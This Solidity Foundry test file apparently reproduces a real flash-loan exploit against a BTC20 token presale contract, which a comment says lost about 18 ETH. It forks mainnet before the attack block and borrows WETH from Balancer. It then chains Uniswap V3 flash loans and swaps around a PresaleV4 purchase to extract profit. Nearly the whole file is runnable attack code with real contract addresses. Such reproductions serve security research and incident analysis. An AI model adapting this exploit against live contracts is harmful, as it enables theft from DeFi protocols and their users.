// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~18ETH
// Attacker : https://etherscan.io/address/0x6ce9fa08f139f5e48bc607845e57efe9aa34c9f6
// Attack Contract : https://etherscan.io/address/0xb7fbf984a50cd7c66e6da3448d68d9f3b7f24f33
// Attack Tx : https://etherscan.io/tx/0xcdd93e37ba2991ce02d8ca07bf6563bf5cd5ae801cbbce3dd0babb22e30b2dbe

// @Analysis
// Twitter Guy : https://twitter.com/DecurityHQ/status/1692924369662513472

contract ContractTest is Test {
    IERC20 BTC20 = IERC20(0xE86DF1970055e9CaEe93Dae9B7D5fD71595d0e18);
    IERC20 SDEX = IERC20(0x5DE8ab7E27f6E7A1fFf3E5B337584Aa43961BEeF);
    IWETH WETH = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    Uni_Pair_V3 SDEX_BTC20_Pair3 = Uni_Pair_V3(0xDb81b8cfB2718f7289ae2365DE800ac2c787E385);
    Uni_Pair_V3 BTC20_WETH_Pair3 = Uni_Pair_V3(0x7234c91bd835a6Ed108c8e986E0663B14F9DE14e);
    Uni_Router_V3 uniRouterV3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    Uni_Router_V2 uniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Uni_Pair_V2 BTC20_WETH_Pair2 = Uni_Pair_V2(0xd50C5B8f04587D67298915E099E170af3Cd6909A);
    IPresaleV4 PresaleV4 = IPresaleV4(0x1F006F43f57C45Ceb3659E543352b4FAe4662dF7);
    address[] private addrPath = new address[](2);
    uint256 Amount_SDEX_BTC20_Pair3 = 76_301_042_059_171_907_852_637;
    uint256 Amount_BTC20_WETH_Pair3 = 47_676_018_750_296_374_476_872;
    uint256 totalBorrowed = 300 ether;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_949_215 - 1);
        vm.label(address(BTC20), "BTC20");
        vm.label(address(WETH), "WETH");
        vm.label(address(SDEX), "SDEX");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(SDEX_BTC20_Pair3), "SDEX_BTC20_Pair3");
        vm.label(address(BTC20_WETH_Pair3), "BTC20_WETH_Pair3");
        vm.label(address(uniRouter), "uniRouter");
        vm.label(address(BTC20_WETH_Pair2), "BTC20_WETH_Pair2");
        approveAll();
    }

    function testExploit() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = totalBorrowed;
        bytes memory userData = "";
        console.log("Before Start: %d ETH", WETH.balanceOf(address(this)));
        Balancer.flashLoan(address(this), tokens, amounts, userData);
        uint256 intRes = WETH.balanceOf(address(this)) / 1 ether;
        uint256 decRes = WETH.balanceOf(address(this)) - intRes * 1e18;
        console.log("Attack Exploit: %s.%s ETH", intRes, decRes);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        exploitBTC();
        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
    }

    function exploitBTC() internal {
        SDEX_BTC20_Pair3.flash(address(this), 0, Amount_SDEX_BTC20_Pair3, abi.encode(Amount_SDEX_BTC20_Pair3));

        (addrPath[0], addrPath[1]) = (address(BTC20), address(WETH));
        Uni_Router_V3.ExactInputSingleParams memory eisParams = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(BTC20),
            tokenOut: address(SDEX),
            fee: 10_000,
            recipient: address(this),
            deadline: type(uint256).max,
            amountIn: BTC20.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        uniRouterV3.exactInputSingle(eisParams);
        (eisParams.tokenIn, eisParams.tokenOut, eisParams.amountIn) =
            (address(SDEX), address(WETH), SDEX.balanceOf(address(this)));
        uniRouterV3.exactInputSingle(eisParams);
    }

    function uniswapV3FlashCallback(uint256 _amount0, uint256 _amount1, bytes calldata data) external {
        uint256 amount = abi.decode(data, (uint256));

        if (amount == Amount_SDEX_BTC20_Pair3) {
            BTC20_WETH_Pair3.flash(address(this), 0, Amount_BTC20_WETH_Pair3, abi.encode(Amount_BTC20_WETH_Pair3));
            (uint256 amountOut, uint256 amountInMax) = (amount + amount / 100 + 1, WETH.balanceOf(address(this)));
            (addrPath[0], addrPath[1]) = (address(WETH), address(BTC20));
            uniRouter.swapTokensForExactTokens(amountOut, amountInMax, addrPath, address(this), type(uint256).max);
            BTC20.transfer(address(SDEX_BTC20_Pair3), amountOut);
        } else if (amount == Amount_BTC20_WETH_Pair3) {
            uint256 amountIn = BTC20.balanceOf(address(this));
            (addrPath[0], addrPath[1]) = (address(BTC20), address(WETH));
            uniRouter.swapExactTokensForTokens(amountIn, 0, addrPath, address(this), type(uint256).max);
            uint256 buyAmount = PresaleV4.maxTokensToSell() - PresaleV4.directTotalTokensSold();
            PresaleV4.buyWithEthDynamic{value: totalBorrowed}(buyAmount);
            (uint256 amountOut, uint256 amountInMax) = (amount + amount / 100 + 1, WETH.balanceOf(address(this)));
            (addrPath[0], addrPath[1]) = (address(WETH), address(BTC20));
            uniRouter.swapTokensForExactTokens(amountOut, amountInMax, addrPath, address(this), type(uint256).max);
            BTC20.transfer(address(BTC20_WETH_Pair3), amountOut);
        }
    }

    function approveAll() internal {
        SDEX.approve(address(SDEX_BTC20_Pair3), type(uint256).max);
        SDEX.approve(address(uniRouterV3), type(uint256).max);
        BTC20.approve(address(SDEX_BTC20_Pair3), type(uint256).max);
        BTC20.approve(address(BTC20_WETH_Pair2), type(uint256).max);
        BTC20.approve(address(BTC20_WETH_Pair3), type(uint256).max);
        BTC20.approve(address(uniRouter), type(uint256).max);
        BTC20.approve(address(uniRouterV3), type(uint256).max);
        WETH.approve(address(uniRouter), type(uint256).max);
        BTC20.approve(address(PresaleV4), type(uint256).max);
        WETH.approve(address(PresaleV4), type(uint256).max);
    }

    event Received(address, uint256);

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}
